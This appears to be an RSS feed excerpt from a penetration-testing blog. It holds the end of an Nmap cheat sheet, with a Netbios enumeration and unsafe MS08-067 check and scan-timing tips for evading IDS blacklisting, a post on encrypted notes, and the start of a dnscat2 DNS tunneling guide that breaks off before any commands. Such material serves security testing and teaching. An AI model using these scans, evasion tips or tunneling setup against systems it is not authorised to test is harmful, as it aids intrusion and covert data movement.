      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;nmap-output-options&quot;&gt;Nmap Output Options&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-oN&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Output Normal&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-oX&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Output to XML&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-oS&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Script Kiddie / 1337 speak... sigh&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-oG&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Output greppable - easy to grep nmap output&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-oA BASENAME&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Output in the three major formats at once&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-v&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Increase verbosity level use -vv or more for greater effect&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-d&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Increase debugging level use -dd or more for greater effect&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--reason&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Display the reason a port is in a particular state&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--open&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Only show open or possibly open ports&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--packet-trace&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Show all packets sent / received&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--iflist&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Print host interfaces and routes for debugging&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
    &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--log-errors&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Log errors/warnings to the normal-format output file&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
    &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--append-output&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Append to rather than clobber specified output files&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
    &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--resume FILENAME&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Resume an aborted scan&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
    &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--stylesheet PATH/URL&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;XSL stylesheet to transform XML output to HTML&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
    &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--webxml&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Reference stylesheet from Nmap.Org for more portable XML&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
    &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--no-stylesheet&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Prevent associating of XSL stylesheet w/XML output&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;misc-nmap-options&quot;&gt;Misc Nmap Options&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-6&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Enable IPv6 scanning&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-A&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Enable OS detection, version detection, script scanning, and traceroute&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--datedir DIRNAME&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Specify custom Nmap data file location&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--send-eth&lt;br /&gt;--send-ip&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Send using raw ethernet frames or IP packets&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--privileged&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Assume that the user is fully privileged&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;--unprivileged&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Assume the user lacks raw socket privileges&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-V&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Show nmap version number&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;-h&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Show nmap help screen&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;nmap-enumeration-examples&quot;&gt;Nmap Enumeration Examples&lt;/h2&gt;

&lt;p&gt;The following are real world examples of Nmap enumeration.&lt;/p&gt;

&lt;h3 id=&quot;enumerating-netbios&quot;&gt;Enumerating Netbios&lt;/h3&gt;

&lt;p&gt;The following example enumerates Netbios on the target networks, the same process can be applied to other services by modifying ports / NSE scripts.&lt;/p&gt;

&lt;p&gt;Detect all exposed Netbios servers on the subnet.&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;Nmap find exposed Netbios servers&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;nmap -sV -v -p 139,445 10.0.1.0/24&lt;/span&gt;
        &lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-11 21:26 GMT&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Nmap scan report for nas.decepticons 10.0.1.12&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Host is up (0.014s latency).&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;PORT        STATE     SERVICE         VERSION&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;139/tcp     open      netbios-ssn     Samba smbd 3.X (workgroup: MEGATRON)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;445/tcp     open      netbios-ssn     Samba smbd 3.X (workgroup: MEGATRON)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Nmap done: 256 IP addresses (1 hosts up) scanned in 28.74 seconds&lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;Nmap find Netbios name.&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;Nmap find exposed Netbios servers&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;nmap -sU --script nbstat.nse -p 137 10.0.1.12&lt;/span&gt;
        &lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-11 21:26 GMT&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Nmap scan report for nas.decepticons 10.0.1.12&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Host is up (0.014s latency).&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;PORT        STATE     SERVICE         VERSION&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;137/udp open  netbios-ns&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Host script results:&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|_nbstat: NetBIOS name: STARSCREAM, NetBIOS user: unknown, NetBIOS MAC: unknown (unknown)
&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Nmap done: 256 IP addresses (1 hosts up) scanned in 28.74 seconds&lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;Check if Netbios servers are vulnerable to MS08-067&lt;/p&gt;

&lt;section class=&quot;shellbox&quot;&gt;
    &lt;div class=&quot;unit golden-large code&quot;&gt;
      &lt;p class=&quot;title&quot;&gt;Nmap check MS08-067&lt;/p&gt;
      &lt;div class=&quot;shell&quot;&gt;
        &lt;p class=&quot;line&quot;&gt;
          &lt;span class=&quot;prompt&quot;&gt;root&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;
          &lt;span class=&quot;command&quot;&gt;nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445&lt;/span&gt;
          &lt;span&gt;10.0.0.1&lt;/span&gt;
        &lt;/p&gt;
          &lt;span class=&quot;output&quot;&gt;&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Nmap scan report for ie6winxp.decepticons (10.0.1.1)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Host is up (0.00026s latency).&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;PORT    STATE SERVICE&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;445/tcp open  microsoft-ds&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Host script results:&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;| smb-check-vulns:&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|   MS08-067: VULNERABLE&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|   Conficker: Likely CLEAN&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|   regsvc DoS: NOT VULNERABLE&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;|_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive)&lt;br /&gt;&lt;/span&gt;
          &lt;span class=&quot;output&quot;&gt;Nmap done: 1 IP address (1 host up) scanned in 5.45 seconds&lt;br /&gt;&lt;/span&gt;
        &amp;lt;/p&amp;gt;
      &lt;/div&gt;
    &lt;/div&gt;
&lt;/section&gt;

&lt;p&gt;The information gathered during the enumeration indicates the target is vulnerable to MS08-067, exploitation will confirm if it’s vulnerable to MS08-067.&lt;/p&gt;

&lt;h2 id=&quot;nmap-scan-optimisation&quot;&gt;Nmap Scan Optimisation&lt;/h2&gt;

&lt;h3 id=&quot;nmap-rate&quot;&gt;Nmap Rate&lt;/h3&gt;

&lt;p&gt;To speed up your scan increase the rate, be aware that setting a high rate value will result in a less accurate scan.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--max-rate 
--min-rate 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;parallelism&quot;&gt;Parallelism&lt;/h3&gt;

&lt;p&gt;The maximum or minimum amount of parallel tasks.&lt;/p&gt;

&lt;p&gt;TIP: If you have an basic IDS / portscan detection blocking your scans you could lower the –min-parallelism in an attempt to reduce the number of concurrent connections&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--min-parallelism
--max-parallelism
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;host-group-sizes&quot;&gt;Host Group Sizes&lt;/h3&gt;

&lt;p&gt;The number of hosts scanned at the same time, Note: if you are writing output to a file e.g., -oA you will need to wait for the host group to complete scanning before the nmap output will be written to the file. Therefore if you get a lagging host you will may end up waiting a while for the output file, which brings us on to… host timeout.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--min-hostgroup 
--max-hostgroup 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;host-timeout&quot;&gt;Host Timeout&lt;/h3&gt;

&lt;p&gt;Nmap allows you to specify the timeout, which is the length of time it waits before giving up on the target. Be careful setting this super low, as you may end up with inaccurate results.&lt;/p&gt;

&lt;p&gt;The following example would giveup after 50 seconds.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--host-timeout 50 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;scan-delay&quot;&gt;Scan Delay&lt;/h3&gt;

&lt;p&gt;An extremely useful option to defeat basic port scan detection (SOHO devices and some IDS) that essentially monitor and block X amount of connects per second (syn flood etc).&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--scan-delay 5s 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For example if you know you can get away with 2 req/sec without getting blacklisted then  you could use:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--scan-delay 1.2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;added 200ms for a buffer&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;disable-dns-lookups&quot;&gt;Disable DNS Lookups&lt;/h3&gt;

&lt;p&gt;Assuming you do not want domain names being looked up, use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n&lt;/code&gt; flag to dissable resolution and speed up the scan.&lt;/p&gt;

&lt;h4 id=&quot;nmap-black-list-detection&quot;&gt;Nmap Black List Detection?&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;It ussally takes and extemely long time to complete&lt;/li&gt;
  &lt;li&gt;Droppped probes nmap will increase the timeout, but it’s likely you are already black listed&lt;/li&gt;
  &lt;li&gt;To confirm, recheck a port that you know was open before&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;As far as I know there is no way of detecting for black listing within nmap natively.&lt;/p&gt;

&lt;h3 id=&quot;optimising-portscans-for-targets&quot;&gt;Optimising Portscans for Targets&lt;/h3&gt;

&lt;p&gt;Once you have identified a target firewall / IDS you can look up the default settings for the portscan black list by reading the manual and use the nmap command switches above to obtain the best performance without getting black listed.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Encrypted Notes App Solution (iOS, Android, MacOS, Linux, Windows)</title>
          <link>https://highon.coffee/blog/encrypted-note-taking-solution/</link>
          <pubDate>Mon, 17 Jan 2022 01:29:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>SecOps</category>
          
          
          <category>SecOps</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/encrypted-note-taking-solution/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#e2e-encrypted-notes-app-solution&quot; id=&quot;markdown-toc-e2e-encrypted-notes-app-solution&quot;&gt;E2E Encrypted Notes App Solution&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#the-cobbled-together-encrypted-notes-app-solution&quot; id=&quot;markdown-toc-the-cobbled-together-encrypted-notes-app-solution&quot;&gt;The Cobbled Together Encrypted Notes App Solution&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#requirements&quot; id=&quot;markdown-toc-requirements&quot;&gt;Requirements&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#desktop-setup-macos-or-windows&quot; id=&quot;markdown-toc-desktop-setup-macos-or-windows&quot;&gt;Desktop Setup: MacOS or Windows&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#mobile-setup-ios&quot; id=&quot;markdown-toc-mobile-setup-ios&quot;&gt;Mobile Setup: iOS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;e2e-encrypted-notes-app-solution&quot;&gt;E2E Encrypted Notes App Solution&lt;/h2&gt;

&lt;p&gt;A setup clunky setup for a platform independent E2E encrypted note taking app solution.&lt;/p&gt;

&lt;p&gt;Note (&lt;em&gt;pun not intended&lt;/em&gt;): If you exclusively use iOS/MacOS you could use Apple Notes + the encrypted notes functionality, but then you are locked into that ecosytem.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Caveat:&lt;/em&gt;&lt;/strong&gt; Only tested between Windows/MacOS/iOS however, there should be no reason this would not work on any other platform that Cryptomator supports.&lt;/p&gt;

&lt;h2 id=&quot;the-cobbled-together-encrypted-notes-app-solution&quot;&gt;The Cobbled Together Encrypted Notes App Solution&lt;/h2&gt;

&lt;h3 id=&quot;requirements&quot;&gt;Requirements&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Must be End-to-End Encrypted AES256 (and encrypt file names)&lt;/li&gt;
  &lt;li&gt;The end user must hold the encryption key&lt;/li&gt;
  &lt;li&gt;It must be possible to sync notes back and forth from mobile to desktop, and desktop to mobile&lt;/li&gt;
  &lt;li&gt;Somewhat scalable / possible to migrate in the future&lt;/li&gt;
  &lt;li&gt;Not be impossible to use once setup, or to difficult that it puts you off bothering to make notes&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;As there is no one app solution for the above the following system was implemented, which works but is a little clunky to say the least.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Cryptomator for encryption (the desktop app has been audited by Cure53)&lt;/li&gt;
  &lt;li&gt;Password manager of choice for key management (if you lose the key it is game over, you will have lost all your notes)&lt;/li&gt;
  &lt;li&gt;Markdown editor or Obsidian for note taking&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;desktop-setup-macos-or-windows&quot;&gt;Desktop Setup: MacOS or Windows&lt;/h2&gt;

&lt;p&gt;The desktop setup is relatively easy, setup a vault with Cryptomator and use a cloud provider for the encrypted vault location (to allow for syncing, unless you plan to manually sync). When the vault is unlocked (open) there will be a localhost volume mounted in MacOS this is where you need to place your Obsidian vault or markdown files.&lt;/p&gt;

&lt;h2 id=&quot;mobile-setup-ios&quot;&gt;Mobile Setup: iOS&lt;/h2&gt;

&lt;p&gt;Buy Cryptomator from the app store (it is a one off payment not a sub). Open your obsidian vault from your cloud storage provider and enter your password, optionally you could setup FaceID for the vault unlocking. Once the vault is mounted, it will appear in the iOS Files app, it will appear at the bottom of the files list as a Cryptomator icon.&lt;/p&gt;

&lt;p&gt;There is an Obsidian iOS app, however it does not appear to be able to open the vault from any other location that the pre-determined locations the applications uses. For this reason on iOS I use iWriter to open and edit notes, again you’ll need to buy this app but it is a one time fee. An additional caveat is that you cannot open the obsidian vault directory within iWriter and can only open one note at a time by navigating to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Open Other&lt;/code&gt; &amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Browse&lt;/code&gt; &amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cryptomator&lt;/code&gt; and then opening the note you wish to edit.&lt;/p&gt;

&lt;p&gt;If this all looks like a lot of work, it is.&lt;/p&gt;

&lt;p&gt;If anyone has a more eloquent solution, tweet me @Arr0way&lt;/p&gt;

</description>
        </item>
        
      
    
      
        
        <item>
          <title>DNS Tunneling dnscat2 Cheat Sheet</title>
          <link>https://highon.coffee/blog/dns-tunnel-dnscat2-cheat-sheet/</link>
          <pubDate>Fri, 04 Jun 2021 10:29:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Infrastructure</category>
          
          
          <category>cheat-sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/dns-tunnel-dnscat2-cheat-sheet/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#what-is-dns-tunneling&quot; id=&quot;markdown-toc-what-is-dns-tunneling&quot;&gt;What is DNS Tunneling&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#you-will-need&quot; id=&quot;markdown-toc-you-will-need&quot;&gt;You Will Need&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#buying-a-domain&quot; id=&quot;markdown-toc-buying-a-domain&quot;&gt;Buying a Domain&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#how-to-change-name-servers-on-namesilo&quot; id=&quot;markdown-toc-how-to-change-name-servers-on-namesilo&quot;&gt;How to Change Name Servers On NameSilo&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#dns-forwarding-with-dnscat2&quot; id=&quot;markdown-toc-dns-forwarding-with-dnscat2&quot;&gt;DNS Forwarding with Dnscat2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#dnscat2-port-forwarding&quot; id=&quot;markdown-toc-dnscat2-port-forwarding&quot;&gt;Dnscat2 Port Forwarding&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;what-is-dns-tunneling&quot;&gt;What is DNS Tunneling&lt;/h2&gt;

&lt;p&gt;DNS tunneling is used to evade egress firewall rules and/or IDS / proxy or other web filtering applicances by tunneling data over DNS. DNS tunneling usually works as external DNS resolution is available on most networks, it should be noted that DNS tunneling is slow due to the low amounts of data that can be transfered. 
&lt;!--more--&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What You Will Learn:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;What is DNS tunneling&lt;/li&gt;
  &lt;li&gt;How to setup dnscat2&lt;/li&gt;
  &lt;li&gt;How to tunnel data over dnscat2&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;you-will-need&quot;&gt;You Will Need&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;A real world domain, &lt;a href=&quot;https://www.namesilo.com/?rid=45f0146bp &quot; rel=&quot;nofollow&quot;&gt;NameSilo&lt;/a&gt; works well and has free WHOIS privacy.&lt;/li&gt;
  &lt;li&gt;A VPS to run DNSCAT2 - &lt;a href=&quot;https://www.linode.com/?r=de68d06f20e245c4952795b3a57180b223ff4d42&quot; rel=&quot;nofollow&quot;&gt;Linode is cheap and works for this and this link will give you a $100 voucher&lt;/a&gt; (see instructions below)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In order to tunnel data over DNS a real world domain must be used and the domains authoritivate name servers must be set to servers in your control.&lt;/p&gt;

&lt;h2 id=&quot;buying-a-domain&quot;&gt;Buying a Domain&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.namesilo.com/?rid=45f0146bp &quot; rel=&quot;nofollow&quot;&gt;NameSilo&lt;/a&gt;  offers free domain WHOIS privacy, a lot of extensions and is well priced.&lt;/p&gt;

&lt;h3 id=&quot;how-to-change-name-servers-on-namesilo&quot;&gt;How to Change Name Servers On NameSilo&lt;/h3&gt;

&lt;p&gt;Login to &lt;a href=&quot;https://www.namesilo.com/?rid=45f0146bp &quot; rel=&quot;nofollow&quot;&gt;NameSilo&lt;/a&gt; and follow these instructions to change the authoritative name servers:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Go to the Domain Manager page within your account&lt;/li&gt;
  &lt;li&gt;Click the applicable domain name (it will be underlined in black)&lt;/li&gt;
  &lt;li&gt;Click the “View/Manage Registered NameServers” link within the “NameServers” box&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;dns-forwarding-with-dnscat2&quot;&gt;DNS Forwarding with Dnscat2&lt;/h2&gt;

&lt;ol&gt;
